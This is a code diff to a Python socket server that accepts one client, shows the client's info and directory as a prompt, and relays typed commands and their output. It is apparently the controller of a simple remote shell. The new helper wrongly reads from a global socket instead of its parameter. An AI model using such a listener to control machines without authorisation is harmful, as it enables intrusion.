@@ -5,7 +5,7 @@ HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
 def socket_receive_all_data(socket_p, data_len):
-    # The none intialisation of data_received is to notify the caller that the data has not been received if data_len is 0
+    # The none initialisation of data_received is to notify the caller that the data has not been received if data_len is 0
     data_received = None
     current_data_length = 0
     while current_data_length < data_len:
@@ -17,9 +17,20 @@ def socket_receive_all_data(socket_p, data_len):
             return None
         if not data_received:
             data_received = data_segment
-        data_received += data_segment
+        else:
+            data_received += data_segment
         current_data_length += len(data_segment)
     return data_received
+
+def send_command_and_receive_all_data(socket_p, command):
+    socket_p.sendall(command.encode())
+    header_data = connection_socket.recv(13)
+    data_len = int(header_data.decode())
+    data_received = socket_receive_all_data(socket_p, data_len)
+    if not data_received:
+        return None
+    return data_received
+
 
 s = socket.socket()
 s.bind((HOST_IP, HOST_PORT))
@@ -30,16 +41,13 @@ connection_socket, client_address = s.accept()
 print(f"Connection established with {client_address}")
 s.close()
 while True:
-    text = input("Command: ")
+    data = send_command_and_receive_all_data(connection_socket, "info")
+    if not data: break
+    client_info_and_current_directory = data.decode()
+    text = input(f"{client_info_and_current_directory} >  ")
     if text == "":
         continue
-    connection_socket.sendall(text.encode())
-
-    header_data = connection_socket.recv(13)
-    data_len = int(header_data.decode())
-    data_received = socket_receive_all_data(connection_socket,data_len)
-    if not data_received:
-        break
-    print(data_received.decode())
+    data = send_command_and_receive_all_data(connection_socket, text)
+    print(data.decode())
 
 connection_socket.close()
